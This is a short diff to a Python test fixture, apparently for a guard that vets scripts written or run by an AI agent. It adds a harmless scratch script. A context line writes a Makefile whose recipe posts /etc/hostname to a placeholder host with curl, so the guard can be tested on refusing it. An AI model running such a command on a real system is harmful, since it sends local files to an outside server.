@@ -344,6 +344,8 @@ def build_fixture(root: Path) -> BenignFixture:
     private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
     _write(private_tmp / "notes.txt", "first draft\n")
     _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
+    # A script an agent wrote for itself in a fresh scratch directory: Guard has never decided on it.
+    _write(private_tmp / "agent-script" / "index.js", "console.log('scratch');\n")
     # A recipe outside the workspace, so running it is refused for what it is
     # rather than for naming a file that is not there.
     _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
